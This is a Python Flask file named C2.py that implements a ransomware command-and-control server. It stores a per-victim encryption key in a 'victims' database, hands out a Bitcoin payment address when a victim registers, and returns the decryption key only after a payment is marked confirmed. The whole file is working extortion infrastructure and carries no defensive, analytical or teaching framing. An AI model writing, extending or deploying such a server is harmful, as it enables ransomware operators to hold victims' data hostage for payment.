# C2.py 
from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import sqlite3, hashlib, os, threading
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)


conn = sqlite3.connect('c2_keys.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS victims 
            (id TEXT PRIMARY KEY, 
             key BLOB, 
             payment_status INTEGER DEFAULT 0,
             first_seen TEXT)''')
conn.commit()

def generate_victim_id():
    return Fernet.generate_key().decode()[:15]

@app.route('/register', methods=['POST'])
def register_victim():
    victim_id = generate_victim_id()
    encryption_key = Fernet.generate_key()
    
    try:
        c.execute("INSERT INTO victims VALUES (?, ?, 0, ?)",
                (victim_id, encryption_key, datetime.utcnow()))
        conn.commit()
        return jsonify({
            'status': 'success',
            'victim_id': victim_id,
            'payment_address': '1ZhrakBTCWalletXXXXXXX'
        }), 201
    except:
        return jsonify({'status': 'error'}), 500

@app.route('/check_payment/<victim_id>')
def check_payment(victim_id):
    c.execute("SELECT key FROM victims WHERE id=? AND payment_status=1", (victim_id,))
    result = c.fetchone()
    return jsonify({'key': result[0] if result else None})

@app.route('/confirm_payment', methods=['POST'])
def confirm_payment():
    data = request.get_json()
    tx_hash = data.get('tx_hash')
    
    
    if len(tx_hash) == 64:
        c.execute("UPDATE victims SET payment_status=1 WHERE id=?", (data['victim_id'],))
        conn.commit()
        return jsonify({'status': 'confirmed'})
    return jsonify({'status': 'invalid_tx'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
